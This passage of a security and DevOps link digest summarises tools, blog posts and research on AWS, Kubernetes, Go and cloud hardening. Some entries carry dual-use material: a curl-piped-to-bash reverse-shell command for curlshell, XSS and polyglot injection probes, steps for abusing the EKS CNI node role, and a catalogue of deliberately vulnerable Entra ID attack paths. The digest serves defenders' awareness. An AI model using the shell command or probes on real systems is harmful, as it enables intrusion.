    • CRDs: OnePasswordItem (with itemPath: "vaults/<vault>/items/<item>") creates a Secret of the same name; OnePasswordItemList creates several.
    • Auto-restart: Deployments using a Secret can be restarted automatically when the 1Password item is updated.
    • License: MIT; use of the APIs is governed by 1Password’s API terms.
    • Docs: A usage guide covers deployment options.

    Takeaway: A simple path to keeping Kubernetes Secrets sourced from 1Password. Compare it with External Secrets Operator if you need several secret backends.

  • renovate-config: Sharable Config Presets for Renovatebot
    summary

    TL;DR: SpotOn’s public Renovate shareable config preset, built for DevOps-heavy repos.

    • Use: Put "extends": ["local>SpotOnInc/renovate-config"] in renovate.json, or adapt it as a GitHub preset in your own org.
    • Onboarding: Update dependencies manually first, enable the Renovate GitHub App, and check the onboarding PR.
    • Recommendations: Move the config to .github/renovate.json5, add a prettier pre-commit hook for .json5, and enable the dependency graph and Dependabot alerts for vulnerability PRs.
    • Schedule: Renovate PRs arrive on Mondays by default.
    • Development: Edit default.template.json5; CI generates default.json after merge.

    Takeaway: A useful example to copy when building your own org-wide Renovate preset for infrastructure repos.

  • selefra: Open-Source Policy-as-Code for Multi-Cloud and SaaS Environments
    summary

    TL;DR: Selefra (“select * from infrastructure”) is an open source policy-as-code tool that runs SQL and YAML policies over configuration data from cloud and SaaS providers, with optional GPT-based analysis.

    • Coverage: Over 30 services, including AWS, GCP, Azure, Alibaba Cloud, Kubernetes, GitHub, Cloudflare and Slack.
    • Policies: Security, compliance and cost rules written in SQL plus YAML, versioned in Git.
    • Automation: Run on schedules or with cloud automation tools to enforce rules.
    • Quick start: brew install selefra/tap/selefra, then selefra init and selefra apply.
    • GPT mode: selefra gpt --openai_mode=gpt-3.5 --openai_api_key=... asks an OpenAI model for security, cost and architecture suggestions.

    Takeaway: An option for SQL-style cloud posture queries. Check project activity before adopting, and think about what config data you send to OpenAI.

  • Amazon GuardDuty EKS Runtime Monitoring Expands Operating Systems and Processor Support
    summary

    TL;DR: AWS announcement (July 7, 2023) that the GuardDuty EKS Runtime Monitoring agent now supports Bottlerocket, Graviton and AMD64 nodes.

    • New support: Bottlerocket OS, AWS Graviton (ARM) and AMD64 processors, and EKS 1.27 clusters.
    • Agent 1.2.0: Performance improvements and built-in CPU and memory limits.
    • Upgrades: Automatic with automated agent management; otherwise you upgrade the add-on yourself. The console’s runtime coverage page shows agent versions.
    • Detection: The eBPF agent watches file access, process execution and network connections, and findings include pod ID, image ID, cluster tags, executable path and process lineage.
    • Trial: 30-day free trial.

    Takeaway: If you skipped runtime monitoring because of Bottlerocket or Graviton nodes, that blocker is gone. Prefer automated agent management.

  • Finding Go Bugs with Fuzzing
    summary

    TL;DR: John Arundel (Bitfield Consulting), in an excerpt from his book The Power of Go: Tests, uses Go’s built-in fuzzing to find and fix bugs in a FirstRune function.

    • Title note: The page is now titled “Fixing a fuzzed-up function: Go fuzz testing explained” and the URL redirects to /posts/bugs-fuzzing; it follows an earlier post, “Target acquired: fuzz targets in Go tests”.
    • Fuzz test: FuzzFirstRune seeds the corpus with f.Add("Hello") and compares against utf8.DecodeRuneInString, skipping invalid runes.
    • Bug 1: A stub returning 0 fails on a seed input under go test -fuzz ..
    • Bug 2: rune(s[0]) panics with “index out of range” on the empty string, which the fuzzer finds and minimizes; the fix returns utf8.RuneError.
    • Bug 3: Byte indexing misreads multi-byte runes; the fuzzer shrinks a failure to the 2-byte “ʭ” (0xcaad); the fix uses for _, r := range s { return r }.
    • Limits: A run of a minute or two at about 43,000 execs/sec found nothing more, which raises confidence but proves nothing.

    Takeaway: Add fuzz targets for any parsing or string-handling function. Failing inputs are saved as regression tests automatically.

  • preevy: Quickly Deploy Preview Environments to the Cloud!
    summary

    TL;DR: Preevy is an Apache 2.0 TypeScript CLI from Livecycle that turns a Docker Compose app into an ephemeral preview environment, typically one per pull request, on your own cloud account or Kubernetes cluster.

    • Targets: Deploys to low-cost VMs on AWS Lightsail, Google Cloud, Microsoft Azure, or to any Kubernetes cluster via a kube-pod driver.
    • Workflow: npm install -g preevy, then preevy init to pick a deploy target and a state storage location, preevy up to deploy, preevy ls to list and preevy down to delete the VM or pod.
    • Access: Services get URLs of the form https://{service}-{port}-{env-id}-{client-id}.{tunnel-server-domain} through a tunnel server; access can be public or protected, on the internet or inside a private network.
    • Env IDs: The environment ID is generated from the Compose project and Git branch, so re-running preevy up syncs the same environment.
    • CI use: Designed to be run from CI so each PR gets a shareable URL for reviewers, designers and E2E test agents.
    • Status: About 2,200 GitHub stars; the repo was still receiving commits in 2026.

    Takeaway: If you already have a Compose file, Preevy is a low-effort way to get per-PR environments without adopting a hosted platform. Check the tunnel server and access model before exposing anything internal.

  • pen-testing-findings: Collection of Weaknesses That May Be Discovered During a Penetration Test
    summary

    TL;DR: A CISA repository of standardized penetration-test findings (names, descriptions, remediation, references, framework mappings and severities) used by assessors to write consistent reports.

    • Coverage: Active Directory, phishing, mobile technology, system, service, web application and wireless weaknesses.
    • Structure: Three layers: Finding Category, General Finding (high level) and Specific Finding (low level); assessors pick a specific finding or tailor a general one.
    • Purpose: Standardization of reporting and trend analysis, faster reporting through pre-filled attributes, comprehensiveness and easy navigation.
    • Integration: Used with CISA’s RVA (Risk and Vulnerability Assessment) Reporting Engine to produce the final engagement report.
    • Status: Archived and read-only; last push August 2022.

    Takeaway: Useful as a ready-made finding library or template for your own pentest report writing. It is archived, so treat the content as a 2022 snapshot.

  • danswer: Ask Questions in Natural Language and Get Answers Backed by Private Sources
    summary

    TL;DR: Danswer was an open-source tool for asking natural-language questions over private company data with answers backed by cited sources. The repo has since been renamed Onyx (onyx-dot-app/onyx) and now positions itself as a self-hostable AI chat and “context layer” platform.

    • Rename: The danswer-ai/danswer URL redirects to onyx-dot-app/onyx; the 2023 Danswer project is the same codebase under a new name.
    • Connectors: Indexes knowledge from 50+ applications, pulling content together with metadata and permissions, with background workers that sync from connectors.
    • Features now listed: Agentic RAG over a hybrid index, multi-step deep research, custom agents with their own knowledge subsets and actions, web search, and support for any LLM.
    • Deployment: Self-hosted; the README offers a one-line installer curl -fsSL https://onyx.app/install_onyx.sh | bash.
    • License: Community Edition under MIT covering core RAG, chat, agents and actions; an Enterprise Edition adds features for larger organizations.
    • Scale: About 33,000 GitHub stars and active development in 2026.

    Takeaway: If you bookmarked Danswer for internal Q&A, look at Onyx instead. Review connector permissions handling and the MIT/EE split before deploying it on sensitive data.

  • PCI/DSS Controls with Falco
    summary

    TL;DR: A Falco blog post by Nigel Douglas (July 2023) mapping three PCI DSS sub-controls to specific Falco runtime detection rules for containerized environments.

    • Context: Lists the 12 PCI DSS requirements and argues that cloud-native systems need runtime monitoring to show compliance.
    • 6.4.2 (separate dev/test from prod): Uses the Network Connection outside Local Subnet rule, scoped by namespace via namespace_scope_network_only_subnet, tagged PCI_DSS_6.4.2; it ships with enabled: false.
    • 10.2.5 (identification and authentication mechanisms): Uses Launch Privileged Container to alert when a container starts with container.privileged=true, with exceptions for trusted images.
    • 11.5.1 (respond to change-detection alerts): Uses Drop and execute new binary in container, a container drift rule that fires when an executable not in the base image runs.
    • Mechanics: Each rule is shown in full YAML with condition, output fields and tags, so it can be copied into a custom rules file.

    Takeaway: A practical template for tagging Falco rules with compliance control IDs. Enable and tune the subnet rule for your namespaces before relying on it as evidence.

  • Enforcing Secure and Cost-Effective Infrastructure as Code with Terraform, OPA, and Infracost
    summary

    TL;DR: A Medium post by Ladibnasr (May 2023), inspired by a Devoxx talk, showing how to gate Terraform pull requests with OPA tag policies and an Infracost cost-increase policy in GitHub Actions.

    • Setup: A basic AWS Terraform project with EC2 and RDS resources.
    • Tag policy: Rego deny[msg] rules on input.resource_changes reject any aws_instance missing env or team tags.
    • Cost policy: A Rego rule sums totalMonthlyCost from Infracost output, compares it with pastBreakdown, and denies changes that raise monthly cost by more than $25.
    • Pipeline: On PRs to main: terraform init, terraform validate, terraform plan -out=tfplan.binary, terraform show -json to plan.json, then infracost breakdown --format json.
    • Evaluation: opa eval --data ./policies/... --input plan.json "data.main.deny"; the job fails if either result file is non-empty and writes violations to $GITHUB_STEP_SUMMARY.
    • Source caveat: Medium blocked direct fetching; the summary is based on a Wayback Machine copy of the article.

    Takeaway: A small, copyable pattern for policy-as-code plus cost guardrails on Terraform PRs. Consider replacing the static AWS keys in the example with OIDC credentials.

  • PodSecurityPolicy Migration with Kyverno
    summary

    TL;DR: A CNCF project post (July 2023, originally on the Kyverno blog) on replacing Kubernetes PodSecurityPolicy, removed in v1.25, with Kyverno policies instead of, or alongside, Pod Security Admission.

    • Background: PSP was deprecated from v1.21 and removed in v1.25; its successor Pod Security Admission (PSA) implements Pod Security Standards with baseline and restricted profiles.
    • PSA limits: Whole profiles only, no mutation, scoped only to cluster or namespace, no Pod controller support beyond audit, audits only in the API server audit log, no custom messages, limited exclusions; no readOnlyRootFilesystem or runtimeClass controls.
    • Kyverno advantages claimed: Works on any resource, can mutate, needs no RBAC changes, auto-generates rules for Deployments and other Pod controllers, reports in cluster-visible Policy Reports, custom messages and flexible exclusions.
    • Migration method: Test existing workloads with kubectl kyverno apply --cluster, then map each PSP field to one Kyverno rule, starting with the narrowest-scoped PSP.
    • Policy library: Kyverno ships pre-built Pod Security Standards policies plus extra policies for PSP-specific cases.

    Takeaway: If you still run PSP-era assumptions, this is a field-by-field migration guide. The comparison table is from the Kyverno project, so expect a pro-Kyverno framing.

  • Refining IAM Permissions Like a Pro
    summary

    (Could not fetch full text.)

    TL;DR: An AWS Workshop Studio self-paced workshop on refining IAM permissions toward least privilege. The page is a JavaScript app and returned only its shell title, so the content could not be read.

    • Topic (from title): Refining existing IAM permissions to remove unused access, the usual scope of IAM Access Analyzer and last-accessed data.
    • Related session: AWS ran a similar re:Invent 2023 workshop, SEC203, “Refining IAM permissions like an expert”, about automatically finding unused and business-critical permissions and updating them safely, including in the SDLC. It may not be the same material.
    • Format: AWS Workshop Studio workshops run in a provided or your own AWS account with step-by-step modules.
    • Source caveat: Based on the title, URL and a web search; the workshop text itself was not readable without a browser.

    Takeaway: Open it in a browser and run it in a sandbox account. Confirm the module list before assigning it to a team.

  • Consolidating Controls in Security Hub: The New Controls View and Consolidated Findings
    summary

    TL;DR: An AWS Security Blog post (July 2023) on two AWS Security Hub features: a consolidated controls view and consolidated control findings, which cut duplicate findings across standards.

    • Scale: Security Hub had more than 200 controls across 30+ services and 85+ partner integrations at the time.
    • Standards: AWS FSBP, PCI DSS 3.2.1, CIS AWS Foundations 1.2.0 and 1.4.0, NIST SP 800-53 Rev. 5, and the Control Tower service-managed standard.
    • Unified IDs: Controls now share one ID across standards, following FSBP naming. Example: FSBP IAM.6, previously also CIS 1.2 1.14, CIS 1.4 1.6, PCI.IAM.4 and CT.IAM.6, is now just IAM.6.
    • Single action: Enable or disable a control across all standards at once instead of up to six separate actions.
    • Consolidated findings: One finding per security check even when enabled in several standards, so suppressions and severity changes are applied once.
    • Compatibility: Old APIs such as UpdateStandardsControl with a StandardControlARN keep working.

    Takeaway: Turn on consolidated control findings to reduce noise and duplicate workflow actions. Update any automation that keys off per-standard control IDs.

  • Coroutines for Go
    summary

    TL;DR: Russ Cox (July 2023) explains why Go would benefit from a coroutine package, shows how to build one in pure Go with goroutines and channels, and reports a runtime-level implementation about 10x faster.

    • Concept: Coroutines run on separate stacks but only one runs at a time, switching with explicit resume and yield; unlike goroutines they give concurrency for program structure, not parallelism.
    • API sketch: coro.New[In, Out any](f func(in In, yield func(Out) In) Out) (resume func(In) Out), built from a channel send-receive pair per switch.
    • Iterators: coro.Pull(push func(yield func(V) bool)) (pull func() (V, bool), stop func()) converts a push iterator into a pull iterator with early stop.
    • Example: Uses the classic Lua binary-tree “same fringe” comparison to motivate the design.
    • Performance: Channel version: 190ns per switch (380ns per pulled value); compiler-fused send-receive: 118ns (236ns); direct runtime coroutine switch using three atomic CAS operations: 20ns per switch, 40ns per pulled value.

    Takeaway: Essential background for Go’s range-over-func iterators and iter.Pull. Read it to understand when pull-style iteration costs anything.

  • Govulncheck v1.0.0 Is Released!
    summary

    TL;DR: The Go blog (Julie Qiu for the Go security team, 13 July 2023) announces govulncheck v1.0.0 and a stable scanning API for finding known vulnerabilities in Go dependencies.

    • Install and run: go install golang.org/x/vuln/cmd/govulncheck@latest, then govulncheck ./... inside a module.
    • Low noise: Analyzes source or binaries and prioritizes vulnerabilities in functions your code actually calls.
    • API: A stable API at golang.org/x/vuln/scan exposes the same functionality; osv-scanner integrates it.
    • Database: Backed by the Go vulnerability database at vuln.go.dev, browsable at pkg.go.dev/vuln; an experimental golang.org/x/vulndb/cmd/indexdb builds your own index.
    • Integrations: VS Code Go extension, vulnerability info on pkg.go.dev pages, and an official GitHub Action for CI.

    Takeaway: Add govulncheck ./... or the GitHub Action to Go CI; its call-graph filtering makes it far less noisy than plain dependency scanners.

  • goread: Read Your RSS/Atom Feeds Right in the Terminal
    summary

    TL;DR: goread is a GPL-3.0 terminal RSS/Atom feed reader written in Go with a Bubble Tea TUI.

    • Features: Feed categories, downloading articles for later, offline mode, customizable color schemes, OPML import/export.
    • Install: go install github.com/TypicalAM/goread@latest, brew install goread, or AUR goread / goread-bin.
    • Config: Feeds live in ~/.config/goread/urls.yml with categories, per-feed whitelist_words and blacklist_words; edit with goread edit urls or in the TUI.
    • Theming: ~/.config/goread/colorscheme.json, generated by --dump_colors, and can be built from a pywal scheme.
    • Status: About 490 stars; last push October 2025.

    Takeaway: A simple way to follow security and release feeds from the terminal, with keyword filters to cut noise.

  • BadZure: Set Up Vulnerable Azure AD Tenants with Multiple Attack Paths
    summary

    TL;DR: BadZure, by Mauricio Velazco, deploys intentionally misconfigured Microsoft Entra ID (Azure AD) tenants and Azure subscriptions with traversable attack paths, for red, blue and purple team practice.

    • Engine now: The current README describes Terraform-based deployment that populates users, groups, applications and Azure resources, then layers misconfigurations on top; this differs from the 2023 version linked originally.
    • Attack paths: Every path starts from a provided compromised foothold and ends at a high-privilege target, so you begin post-compromise.
    • Techniques: Seven atomic templates: ApplicationOwnershipAbuse, ApplicationAdministratorAbuse, CloudAppAdministratorAbuse (identity plane); ManagedIdentityAbuse, KeyVaultSecretTheft, StorageCertificateTheft, CosmosDBSecretTheft (resource plane), plus chained custom paths.
    • Audience: Red teamers, detection engineers generating telemetry, purple teams, researchers, trainers and CTF authors.
    • Recognition: Presented at Black Hat USA Arsenal 2024 and 2026; documentation at badzure.com; Apache 2.0.

    Takeaway: Use a dedicated, disposable tenant to rehearse Entra ID privilege escalation and build detections. Never point it at a production tenant.

  • curlshell: Reverse Shell Using curl
    summary

    TL;DR: curlshell is a small Python HTTPS server that gives you an interactive reverse shell over curl, for environments where outbound traffic only goes through an HTTP CONNECT proxy.

    • Problem: Raw outbound TCP is blocked and only HTTPS_PROXY egress works, so classic reverse shells fail.
    • Mechanism: The server multiplexes the remote shell’s stdin, stdout and stderr over HTTP with curl as the transport.
    • Listener: ./curlshell.py --certificate fullchain.pem --private-key privkey.pem --listen-port 1234.
    • Target side: curl https://curlshell:1234 | bash.
    • Status: About 480 stars, last push April 2024, no license file.

    Takeaway: A reminder that proxy-only egress does not stop interactive shells. Defenders should inspect and restrict what proxied curl traffic can reach.

  • Abusing Amazon VPC CNI Plugin for Kubernetes
    summary

    TL;DR: elttam research (2023) shows how an attacker with a foothold on an Amazon EKS node can abuse the Amazon VPC CNI plugin’s IAM permissions to rewire networking of unrelated EC2 instances, even in other VPCs.

    • Root cause: Node groups get the AWS managed AmazonEKS_CNI_Policy, which grants ec2:CreateNetworkInterface, AttachNetworkInterface, DetachNetworkInterface, ModifyNetworkInterfaceAttribute, DescribeInstances and more on Resource: *.
    • Foothold: After a container escape, the attacker uses the node role (MITRE T1552.005) and can inspect containers with nerdctl -n k8s.io ps.
    • Attack: Enumerate all instances with aws ec2 describe-instances, find an internet-reachable ENI with an Elastic IP in the target’s VPC (unattached or secondary), detach it and attach it to the target instance to expose it, demonstrated with SSH.
    • Lab detail: Built with eksctl create cluster --version 1.27; eksctl get addons showed no add-ons although aws-node was running.
    • Hardening: Block pod access to IMDS, give workloads dedicated IAM roles (IRSA), scope IAM policies and tighten security groups; container escape to root still allows the attack.

    Takeaway: Treat the EKS node role as a powerful network-admin credential. Move the CNI to IRSA with tighter scope and block IMDS from pods.

  • Cloudflare Pages with Zero Trust Authentication: Terraform
    summary

    TL;DR: A small Terraform module by Marco Lancini that creates a Cloudflare Pages application protected by Cloudflare Zero Trust (Access) authentication, so only listed email addresses can reach it.

    • Inputs: cloudflare_account_id, cloudflare_zone_id, name of the Pages app, hostname and domain for the custom domain.
    • Auth: zero_trust = true plus allowed_emails = ["admin@example.com"] restricts access to those identities.
    • Usage: Referenced as a local module (source = "<path>/cloudflare-pages") from Lancini’s utils repository.
    • Scope: A README with one usage example; no further documentation.

    Takeaway: A quick way to host private static sites or internal docs behind identity-aware access without running servers. Copy and pin it rather than referencing the repo directly.

  • Optimize AWS Config for AWS Security Hub to Effectively Manage Your Cloud Security Posture
    summary

    TL;DR: An AWS Security Blog post (2023) explaining how to configure the AWS Config recorder to record only the resource types AWS Security Hub controls need, reducing Config cost and data volume.

    • Dependency: Change-triggered Security Hub checks rely on the AWS Config configuration recorder; periodic checks do not.
    • Numbers: AWS Config records more than 300 resource types by default; Security Hub controls covered about 60 of them.
    • Template: AWS provides a CloudFormation template on GitHub that records only the needed types; deploy it across accounts and Regions with StackSets.
    • Maintenance: New Security Hub controls may need extra resource types; subscribe to the Security Hub SNS announcements and check the template is current.
    • Side effect: Control Config.1 (AWS Config should be enabled) fails if not all resources are recorded; disable it or suppress with Security Hub automation rules.
    • Cost model: AWS Config charges per recorded configuration item, separately from Security Hub.

    Takeaway: If you run Config only for Security Hub, trimming the recorder is a straightforward cost saving. Handle the Config.1 finding deliberately.

  • Go 1.22 Inlining Overhaul
    summary

    (Could not fetch full text.)

    TL;DR: The Google Doc design proposal for overhauling the Go compiler’s inliner, targeted at Go 1.22 and tracked in Go issue #61502 (“cmd/compile: overhaul inliner”).

    • Tracking issue: #61502 was opened by Austin Clements on 21 July 2023 with the goal of a much more effective inliner in Go 1.22.
    • People: The work was driven by Than McIntosh (@thanm) and Matthew Dempsky (@mdempsky), with community input requested.
    • Motivation: Press coverage (Golang Weekly) described Go’s rules for when and what to inline as somewhat out of date.
    • Early code: McIntosh’s CLs added inliner “function properties” machinery to feed new inlining heuristics.
    • Source caveat: The Google Doc only rendered its UI shell without a browser; summary based on the title, the linked issue and search results.

    Takeaway: Follow issue #61502 and the Go release notes for what actually shipped. Do not rely on the proposal for current inliner behavior.

  • Go: A Gentle Introduction to Pointers
    summary

    TL;DR: A short Go tutorial by Alex Edwards (July 2023) explaining pointers: addresses, pointer types and dereferencing.

    • Address-of: &answer returns a pointer; printing it shows a memory address like 0xc00001c030.
    • Pointer types: A *int can only hold the address of an int, a *string the address of a string.
    • Declaration: Shows longhand var answerPtr *int = &answer and shorthand answerPtr := &answer.
    • Dereference read: *answerPtr reads the underlying value (prints 42).
    • Dereference write: *answerPtr = 99 changes the original variable through the pointer.

    Takeaway: A clear refresher for newcomers to Go; pair it with material on when to pass pointers versus values.

  • mailpit: Email and SMTP Testing Tool with API for Developers
    summary

    TL;DR: Mailpit is an MIT-licensed Go email and SMTP testing tool with a web UI and REST API, inspired by the no-longer-maintained MailHog.

    • Packaging: A single static binary or multi-architecture Docker images, zero dependencies.
    • Capture and view: SMTP server (optional STARTTLS/TLS and auth, including “accept any”), web UI with search, HTML/source/headers/raw/attachments views, real-time updates over websockets.
    • Testing aids: HTML compatibility check, link check, SpamAssassin spam check, HTML screenshots, mobile preview, chaos mode for SMTP errors, List-Unsubscribe validation.
    • Integration: REST API for integration tests, optional POP3 server, webhooks, SMTP relay and forwarding with recipient allowlists.
    • Throughput: Ingests 200-300 emails per second over SMTP depending on hardware; keeps the most recent 500 emails by default.
    • Status: About 10,800 stars and active in 2026.

    Takeaway: A drop-in MailHog replacement for dev and CI. Swap it in to get maintained code and API-driven email assertions.

  • gitid: Management of Multiple Git SSH Keys Made Easy
    summary

    TL;DR: GitID is an MIT-licensed TypeScript CLI by Inderdeep Bajwa for creating, listing and switching between multiple Git SSH identities on one machine, for example personal, work and client accounts.

    • Install: npm install -g gitid.
    • Create: gitid new personal --name "Jane Doe" --email jane@example.com generates an ed25519 key and adds a matching Host alias to ~/.ssh/config.
    • Switch: gitid use personal rewrites the current repo’s remote to the chosen SSH host alias; gitid current shows which identity a repo uses.
    • Inspect: gitid list lists managed aliases and prompts repair of broken entries; gitid show personal prints the public key to add to GitHub.
    • Author info: gitid set stores per-identity user.name and user.email applied as repo-local git config.
    • Caution: The README warns that it edits SSH config and advises backing up ~/.ssh first.

    Takeaway: Handy if you juggle several Git accounts. Back up ~/.ssh/config and review the generated Host blocks before trusting it.

  • Web Application Black-Box Testing
    summary

    TL;DR: A YesWeHack blog post by Brumens (June 2023) on black-box testing of web applications: how to design payloads that trigger unexpected behaviour and how to work out where that behaviour comes from.

    • Goals: Learn what a function does, what inputs and data types it accepts, which technologies sit behind it, and the security concerns, without source code.
    • Techniques: State transition testing, fuzzing (generation-based and mutation-based), error guessing and regression testing.
    • Non-exploiting probes: Prove XSS with "><h1>hello</h1> instead of a script payload to avoid WAF or CSP blocks.
    • Polyglot fuzz payload: <z>"z'z%}})z${{z` aims to trigger quote breakouts, template engine errors, XSS, format injection and validation messages in one request.
    • Structural variation: Test both 'z\ and \z'; one can break out of quotes while the other causes escape-sequence errors, so a single payload can miss the bug.
    • Locating reflection: Compare responses with client-side JavaScript disabled to tell DOM-based reflection from server-side reflection.
    • Source caveat: The original URL now redirects to the YesWeHack blog index; summary based on a Wayback Machine copy.

    Takeaway: A useful mental model for manual testing. Keep a small set of polyglot and structural-variant probes for first-pass input testing.

  • Cloud Architecture Security Cheat Sheet
    summary

    TL;DR: The OWASP Secure Cloud Architecture Cheat Sheet covers common security patterns for designing and reviewing cloud architectures, written for medium to large enterprises.

    • Start with risk: Do risk analysis, threat modeling and attack surface assessment to decide likely threats, their likelihood and business impact.
    • Public vs private: Secure object storage with IAM, signed URLs for temporary access, and care with public buckets.
    • Network: VPCs with public and private subnets and a simple reference architecture.
    • Trust boundaries: Three worked models: no trust (every component re-authenticates and compute uses ephemeral identities for storage), high trust, and some trust.
    • Tooling: Web application firewall, logging and monitoring, and DDoS protection.
    • Shared responsibility: Differences across IaaS, PaaS and SaaS, update strategy for self-managed services, and avoiding gaps in managed service security.

    Takeaway: Use it as a review checklist for cloud designs, especially the trust-boundary examples when deciding where to require authentication.

  • No Keys Attached: Exploring GitHub-to-AWS Keyless Authentication Flaws
    summary

    TL;DR: Datadog Security Labs research by Christophe Tafani-Dereeper (2023) showing that many AWS IAM roles trusting GitHub Actions OIDC lacked a sub condition, so any GitHub repository could assume them; a UK Government Digital Service role was one case.

    • Secure setup: OIDC provider https://token.actions.githubusercontent.com with audience sts.amazonaws.com, plus trust policy conditions on token.actions.githubusercontent.com:sub (e.g. repo:octo-org/octo-repo:*) and :aud.
    • Flaw: Without the sub condition, a GitHub Action in any repository can assume the role and get AWS credentials; insecure third-party guides spread the pattern.
    • Hunting: Found candidate role ARNs with a Sourcegraph regex search over .github/workflows files, then tested assumption from their own workflows.
    • Results: Several vulnerable, often highly privileged CI/CD roles were assumed and reported to maintainers, including one in a UK government account.
    • Guardrails: GitHub Enterprise custom issuer URLs (token.actions.githubusercontent.com/<org>); Datadog added a CSPM rule on 17 May 2023 and a CloudTrail query for AssumeRoleWithWebIdentity from unexpected repos.
    • Update: A June 2025 note says AWS now blocks creating new roles with this vulnerable trust policy, but existing roles remain affected.

    Takeaway: Audit every IAM role trusting GitHub OIDC for a strict sub condition. AWS’s 2025 block does not fix roles created earlier.

  • AWS Networking Concepts: Mindmap
    summary

    TL;DR: A short blog post by miparnisari (March 2023) sharing a Lucidchart mind map that links AWS networking resources together, made after reading Toni Pasanen’s book AWS Networking Fundamentals.

    • Motivation: The AWS VPC console has many resource types because there are many connection types: account to on-premises, account to account, VPC to VPC, subnet to subnet, VPC to internet and VPC to AWS services.
    • Artifact: A single mind map image with a Lucidchart link that can be exported to other formats.
    • Source book: AWS Networking Fundamentals by Toni Pasanen.
    • Community feedback: Comments point out that ENIs deserve a place, since security groups are attached to ENIs, plus corrections for certification study.
    • Reach: The post was picked up on Hacker News and translated summaries in July 2023.

    Takeaway: A quick visual orientation for AWS networking. Check the comments for corrections before using it for exam prep.

  • Configure Keycloak on Amazon Elastic Kubernetes Service (Amazon EKS) Using Terraform
    summary

    TL;DR: An AWS Open Source Blog walkthrough (July 2023) deploying Keycloak, the open-source identity and access management server, on Amazon EKS with Terraform and Helm.

    • Infrastructure: VPC with public and private subnets, NAT and internet gateways, Aurora MySQL-Compatible database, EKS with managed node group, metrics server and cluster autoscaler.
    • Ingress and TLS: AWS Load Balancer Controller, NGINX Ingress Controller behind an ALB, ACM certificates and Route 53 records in an existing hosted zone.
    • App: Keycloak.X deployed to EKS via Helm charts.
    • Steps: git clone https://github.com/aws-samples/configure-keycloak-on-eks-using-terraform.git, set db_username, db_password, route53_zone_id and domain values in terraform/terraform.tfvars, then apply.
    • Cleanup: make destroy removes 91 resources.
    • Prerequisites: Git, AWS CLI, kubectl, Terraform and local AWS credentials.

    Takeaway: A full reference stack for self-hosting Keycloak on EKS. Move the database password out of tfvars into a secrets store before using it beyond a demo.

  • Secure Connectivity from Public to Private: Introducing EC2 Instance Connect Endpoint
    summary

    TL;DR: An AWS Compute Blog post (14 June 2023) launching EC2 Instance Connect (EIC) Endpoint, an identity-aware TCP proxy for SSH or RDP to private instances without public IPs, internet gateways, bastion hosts or agents.

    • How it works: The AWS CLI opens a WebSocket tunnel to the endpoint using IAM credentials; you then point your normal client at 127.0.0.1, or use the console.
    • Command: aws ec2-instance-connect open-tunnel --instance-id ..., usable as an SSH ProxyCommand.
    • No IGW or NAT: The VPC does not need direct internet connectivity, and no agent is needed on the target, so it also works for third-party appliances.
    • Controls: IAM policies plus security groups govern who can connect to which instance and port; authentication happens before traffic enters the VPC.
    • Logging: CloudTrail records the IAM principal, source IP, destination IP and port; optional client IP preservation.
    • Comparison: Combines with EC2 Instance Connect ephemeral SSH keys, which previously needed a public IP; Systems Manager Session Manager remains the agent-based alternative.

    Takeaway: A strong option to retire bastion hosts. Scope the IAM permissions and endpoint security groups tightly, since this opens a path from public space into private subnets.

  • Securing Kubecost Access with Amazon Cognito
    summary

    TL;DR: An AWS Containers Blog post (2023) showing how to expose the Kubecost cost dashboard on EKS to people outside the cluster, such as finance teams, while authenticating them with Amazon Cognito.

    • Problem: Kubecost’s dashboard is protected by NGINX basic auth by default, which AWS says is not recommended for production.
    • Context: Kubecost is built on OpenCost (CNCF Sandbox); AWS offers a free EKS-optimized Kubecost bundle with troubleshooting support.
    • Architecture: Kubernetes Ingress through an Application Load Balancer integrated with Cognito, TLS certificate from ACM, DNS in Route 53.
    • Tooling: Uses the ingress-auth-cognito EKS Blueprints pattern and the Kubecost add-on for EKS CDK Blueprints.
    • Sign-up control: A Cognito pre-sign-up Lambda only allows emails from allow-listed domains, stored in an SSM parameter, with email verification codes.

    Takeaway: The ALB plus Cognito pattern works for any internal dashboard on EKS. Restrict sign-up domains, or disable self sign-up entirely, before exposing it.

  • Continue: A VS Code Extension That Brings the Power of ChatGPT to Your IDE
    summary

    TL;DR: Continue was an open-source AI coding assistant for VS Code (and later other IDEs) that brought ChatGPT-style models into the editor. Its site now says Continue has been acquired by Cursor.

    • Current page: continue.dev shows a farewell notice: “Continue has joined Cursor”, calling it “a pioneering open-source coding agent”.
    • Code remains: The notice says the open-source codebase stays freely available; the continuedev/continue GitHub repo (Apache-2.0, about 36,000 stars) was not archived as of October 2026.
    • FAQ topics: The page covers what happened to open source availability, user data and subscriptions.
    • Original pitch (from title): A VS Code extension bringing ChatGPT-class models into the IDE.
    • Source caveat: The 2023 product page is gone; summary based on the current acquisition notice, the title and GitHub metadata.

    Takeaway: Do not adopt Continue as a maintained product without checking the repo’s activity after the acquisition. Existing self-hosted setups keep working from the open-source code.

  • cdk-aws-observability-accelerator: CDK AWS Observability Accelerator
    summary

    TL;DR: AWS Observability Accelerator for CDK is an MIT-0 set of opinionated TypeScript CDK modules from AWS for setting up observability on EKS with AWS native and AWS-managed open-source services.

    • Services: Amazon Managed Service for Prometheus, Amazon Managed Grafana, AWS Distro for OpenTelemetry (ADOT) and Amazon CloudWatch.
    • Patterns: ADOT collector monitoring, CloudWatch and Grafana dashboards, AMP alerting and recording rules, cost monitoring, Container Insights metrics.
    • Workloads: GPU and Inferentia, Istio, NGINX and Java/JMX monitoring.
    • Logs and traces: FluentBit and ADOT for logs; ADOT X-Ray exporter or X-Ray daemon for traces.
    • Layouts: Single EKS cluster “AWS native” and “open source” reference architectures; patterns live in lib/.
    • Requirements: AWS CLI, Node.js and npm, with make and brew, or a provided DevContainer.

    Takeaway: A quick start if you are already on CDK and EKS and want AMP/AMG/ADOT wired together. Terraform users should look at the sibling Terraform accelerator.

  • New: AWS Public IPv4 Address Charge + Public IP Insights
    summary

    TL;DR: Jeff Barr’s AWS News Blog post (28 July 2023) announcing that from 1 February 2024 AWS charges $0.005 per hour for every public IPv4 address, attached or not, plus a free Public IP Insights feature to find them.

    • Price: $0.005 per IP per hour for in-use public IPv4 addresses, including Amazon-provided and Elastic IPs, Global Accelerator and Site-to-Site VPN tunnels; previously in-use addresses were free.
    • Reason: IPv4 scarcity; AWS says the cost of acquiring one address rose more than 300% over the previous five years.
    • Scope: All services that can hold public IPv4 (EC2, RDS, EKS nodes and others) in all Regions, including China and GovCloud.
    • Exceptions: EC2 Free Tier includes 750 hours of public IPv4 per month for the first 12 months; BYOIP addresses are not charged.
    • Visibility: Cost and Usage Reports include public IPv4 usage; Public IP Insights in VPC IP Address Manager is free.
